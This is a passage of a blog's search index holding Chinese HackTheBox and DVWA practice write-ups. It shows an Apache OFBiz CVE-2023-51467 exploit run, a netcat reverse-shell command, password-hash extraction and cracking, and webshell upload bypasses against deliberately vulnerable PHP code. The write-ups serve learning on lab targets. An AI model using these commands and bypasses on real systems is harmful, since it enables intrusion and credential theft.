<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackTheBox靶场之Bizness</title>
    <link href="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/"/>
    <url>/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/</url>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox靶场之Bizness"><a href="#HackTheBox靶场之Bizness" class="headerlink" title="HackTheBox靶场之Bizness"></a>HackTheBox靶场之Bizness</h1><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>启动机器</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-1.png" alt="IP"></p><p>使用nmap对IP进行扫描</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap -sS -A -sC -sV -p- --min-rate 6000 10.10.11.252<br><br><span class="hljs-deletion">-sS使用TCP SYN扫描（也称为半开放扫描），扫描单个主机上的所有TCP端口</span><br><span class="hljs-deletion">-A检测远程主机上运行的操作系统和版本</span><br><span class="hljs-deletion">-sC扫描一个主机的所有TCP端口，同时使用默认脚本扫描，脚本在Nmap的安装目录下的scripts目录中</span><br><span class="hljs-deletion">-sV检测打开的端口以确认服务/版本信息</span><br><span class="hljs-deletion">-p-全端口扫描</span><br><span class="hljs-deletion">--min-rate让nmap以不小于每秒6000次的速率进行扫描，数字越大速度越快</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-2.png" alt="nmap扫描结果"></p><p>得到一个 biziness.htb 的域名，添加到hosts</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;10.10.11.252 bizness.htb&quot;</span> | sudo tee -a <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-3.png" alt="把域名写入hosts"></p><p>然后打开80端口查看结果</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-4.png" alt="浏览器访问80端口"></p><p>也可以使用curl命令访问，只是看到的内容是源代码的方式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -k https:<span class="hljs-regexp">//</span>bizness.htb<br><br>-k表示允许不安全链接<br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-5.png" alt="curl访问结果"></p><p>80端口就只看到一个邮箱加电话信息以外（也不一定能用到），基本没啥信息</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-6.png"></p><p>尝试目录扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u https:<span class="hljs-regexp">//</span>bizness.htb/<br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-7.png"></p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-8.png"></p><p>在结果中发现两个意思后台登录的页面，访问后发现都是一个登录框</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-9.png"></p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-10.png"></p><p>里面有很多信息，<strong>ofbiz</strong>，右下角有个<strong>18.12</strong>版本信息</p><h2 id="0x02-web渗透测试"><a href="#0x02-web渗透测试" class="headerlink" title="0x02 web渗透测试"></a>0x02 web渗透测试</h2><p>首先应该是尝试弱口令和密码爆破（但是我现在太菜，还没系统了解），所以直接跳过了</p><p>直接网上搜索对应版本的漏洞</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-11.png"></p><p>发现存在漏洞CVE-2023-51467，直接下载POC</p><p>然后检测是否存在漏洞</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-12.png"></p><p>发现可能存在漏洞，继续利用POC中的命令执行进行反弹shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> exploit.<span class="hljs-keyword">py</span> --url http<span class="hljs-variable">s:</span>//bizness.htb/ --cmd <span class="hljs-string">&#x27;nc -c sh IP地址 端口&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-13.png" alt="反弹shell"></p><p>反弹成功</p><p>修改显示方式</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-14.png"></p><p>尝试在此权限下看能不能找到flag文件，最终在 <strong>/home/ofbiz</strong> 目录下找到 <strong>user.txt</strong>查看后发现就是我们需要的内容</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/1-15.png"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>在常规的提权中有suid提权和内核版本提权（但是我现在还不会，后面会补充）</p><p>通过查看大佬文章，Apache PFBiz组件包含了数据库，因此直接尝试从数据库中搜索敏感信息</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd <span class="hljs-regexp">/opt/</span>ofbiz<span class="hljs-regexp">/runtime/</span>data<span class="hljs-regexp">/derby/</span>ofbiz/seg0<br><span class="hljs-keyword">grep</span> -arin -o -E <span class="hljs-string">&#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/3-1.png"></p><p>通过查看HASh的文章发现，图中$<SHA>表示的是SHA系列，然后**$d**应该是用于增加哈希值复杂度的盐，后面部分的编码应该就是SHA处理过的值，所以需要先进行解密</SHA></p><p>使用cyberchef对后半段字符串进行base64解密成16进制的字符串</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/3-2.png"></p><p>因为我们的哈希是加了盐，所以直接使用kali自带的 hashcat 对它进行爆破</p><p>将我们解密的值加上盐d，写入一个txt文档中</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/3-3.png"></p><p>然后使用命令进行爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">120</span> -a <span class="hljs-number">0</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/3-4.png"></p><p>爆破得到密码是monkeybizness，直接提权，成功在 /root目录下找到 root flag</p><p><img src="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BBizness/3-5.png"></p>]]></content>
    
    
    <categories>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox靶场之Usage</title>
    <link href="/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BUsage/"/>
    <url>/2024/05/11/HackTheBox%E9%9D%B6%E5%9C%BA%E4%B9%8BUsage/</url>
    
    <content type="html"><![CDATA[<h1 id="HackTheBox靶场之Usage"><a href="#HackTheBox靶场之Usage" class="headerlink" title="HackTheBox靶场之Usage"></a>HackTheBox靶场之Usage</h1><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2>]]></content>
    
    
    <categories>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kfc杯9</title>
    <link href="/2024/04/15/kfc%E6%9D%AF9/"/>
    <url>/2024/04/15/kfc%E6%9D%AF9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境简述"><a href="#0x01-环境简述" class="headerlink" title="0x01 环境简述"></a>0x01 环境简述</h2><p><img src="/2024/04/15/kfc%E6%9D%AF9/1-1.png" alt="1-1"></p><p>目标不明，需要进行信息搜集</p><p>我这里使用的是一个在线信息搜集工具（<a href="http://z.zcjun.com/%EF%BC%89%E5%8A%A0sitescan">http://z.zcjun.com/）加sitescan</a></p><h2 id="0x02-实战环节"><a href="#0x02-实战环节" class="headerlink" title="0x02 实战环节"></a>0x02 实战环节</h2><p><img src="/2024/04/15/kfc%E6%9D%AF9/1-2.png" alt="1-2"></p><p>目标1：<a href="http://doc.hackme.cc/">http://doc.hackme.cc/</a></p><p>此站点存在任意文件上传漏洞</p>]]></content>
    
    
    <categories>
      
      <category>靶机渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之不安全验证</title>
    <link href="/2024/02/27/DVWA%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81/"/>
    <url>/2024/02/27/DVWA%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之XSS已存储</title>
    <link href="/2024/02/27/DVWA%E4%B9%8BXSS%E5%B7%B2%E5%AD%98%E5%82%A8/"/>
    <url>/2024/02/27/DVWA%E4%B9%8BXSS%E5%B7%B2%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之XSS反射</title>
    <link href="/2024/02/27/DVWA%E4%B9%8BXSS%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/02/27/DVWA%E4%B9%8BXSS%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之SQL注入（盲注）</title>
    <link href="/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89/"/>
    <url>/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之SQL注入</title>
    <link href="/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/27/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之文件上传</title>
    <link href="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h3 id="一、-漏洞原理"><a href="#一、-漏洞原理" class="headerlink" title="一、 漏洞原理"></a>一、 漏洞原理</h3><ol><li><p><strong>文件上传漏洞定义</strong></p><p>文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也越大。</p><p>如果恶意用户上传了可执行的文件或脚本，就会导致网站被其控制甚至会使服务器沦陷，以至于引发恶意的网络安全事件。</p></li><li><p><strong>文件上传漏洞原理</strong></p><p>文件上传漏洞是指用户通过界面上的上传功能上传了一个可执行的脚本文件，而web端的系统并<strong>未对其进行检测</strong>或者<strong>检测的逻辑不够好</strong>。</p><p>总的来说文件上传功能是没有问题的，主要是服务器如何对上传的文件进行处理。</p><p>若web未对用户上传的文件进行有效的审查，若存在恶意用户对其上传一句话木马，从而实现控制web网站的目的。</p></li><li><p><strong>文件上传思路</strong></p><p>3.1 常规类</p><p>扫描获取上传，会员中心头像上传，后台系统上传，其他途径上传。</p><p>3.2 cms类</p><p>已知道的cms源码。</p><p>3.3 编辑类</p><p>ckeditor、fackditor、kinededitor、xxxxeditor</p></li></ol><hr><h3 id="二、-靶场实战"><a href="#二、-靶场实战" class="headerlink" title="二、 靶场实战"></a>二、 靶场实战</h3><h4 id="1-LOW"><a href="#1-LOW" class="headerlink" title="1. LOW"></a>1. LOW</h4><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>    <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>        <span class="hljs-comment">// No</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Yes!</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到代码对上传的文件是没有任何限制和过滤的，存在明显的上传漏洞，成功上传后为提示<strong>路径 + succesfully uploaded</strong> 上传失败则会提示 <strong>your image was not uploaded</strong></p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>上传一个包含一句话木马的php，我们可以发现上传成功。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1-1.png"></p><p>使用蚁剑连接木马，木马也成功连接</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1-2.png"></p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1-3.png"></p><h4 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2. Medium"></a>2. Medium</h4><h5 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里可以看到，首先是使用$_files函数获取上传文件的信息</p><p>然后使用 if 语句判断上传类型是否为图片类型 jpeg/png，并且文件大小是小于10000字节（约等于100M）</p><p>当我们依然上传上一道题的aa.php时，页面显示上传文件类型不正确。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-1.png"></p><h5 id="方法1：burp抓包"><a href="#方法1：burp抓包" class="headerlink" title="方法1：burp抓包"></a>方法1：burp抓包</h5><ol><li><p>直接上传 aa.php 文件</p></li><li><p>使用burp抓取上传的数据包</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-2.png"></p></li><li><p>将Content-Type类型改为 image/png</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-3.png"></p></li><li><p>点击 Forward 放包后发现文件上传成功</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-4.png"></p></li><li><p>使用蚁剑连接</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-5.png"></p></li><li><p>连接成功</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-6.png"></p></li></ol><h5 id="方法2：使用-cmd-命令制造图片木马与文件包含漏洞"><a href="#方法2：使用-cmd-命令制造图片木马与文件包含漏洞" class="headerlink" title="方法2：使用 cmd 命令制造图片木马与文件包含漏洞"></a>方法2：使用 cmd 命令制造图片木马与文件包含漏洞</h5><ol><li><p>使用xxd(Linux命令之xxd命令主要用来查看文件对应的十六进制形式，也可以讲文件对应的十六进制形式输出到一个指定的文件。使用此命令所支持的特有选项，亦可以以二进制的形式查看文件)查看十六进制的第一行数据，可发现后缀为.png的图片前几个字符为8950 4e47，因此可通过前几个字符来判断是否为后缀.png的图片,同时我们可以伪造一张图片，保证十六进制数据的前几个字符为8950 4e47，在数据中插入一些恶意代码，从而实现getimagesize的绕过。</p><p>windows直接使用 copy命令制作图片木马</p></li><li><p>新建一个写入一句话木马的 aa.php（也可以是txt） 文档，然后创建一个 aa.png 的图片，将图片和 php文档放入同一个文件夹中，在文件地址处打开cmd命令行</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-7.png"></p></li><li><p>在cmd命令行中输入 <strong>copy aa.png/b + aa.p/a 1.jpg</strong>，即可制作一个文件名为 1.jpg的图片木马。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2-8.png"></p></li><li><p>通过文件包含漏洞对我们上传的1.jpg文件进行解析，同时获取新的木马文件</p></li></ol><h4 id="3-High"><a href="#3-High" class="headerlink" title="3. High"></a>3. High</h4><h5 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = substr( <span class="hljs-variable">$uploaded_name</span>, strrpos( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//substr函数提取字符串长度，strrpos函数统计“.”出现的最后位置，然后加一</span><br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br>    <span class="hljs-comment">//已上传文件在服务器端保存的临时文件名，包含路径</span><br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>    <span class="hljs-comment">//strtolower函数将大小字母转换为小写</span><br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一个 <strong>if语句</strong> 对上传文件的类型进行了检测，只能上传图片</p><p>然后 <strong>getimagesize</strong> 函数会获取图像的大小和格式，这样用来防止通过抓包改后缀的攻击方式</p>]]></content>
    
    
    
    <tags>
      
      <tag>DVWA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之文件包含</title>
    <link href="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
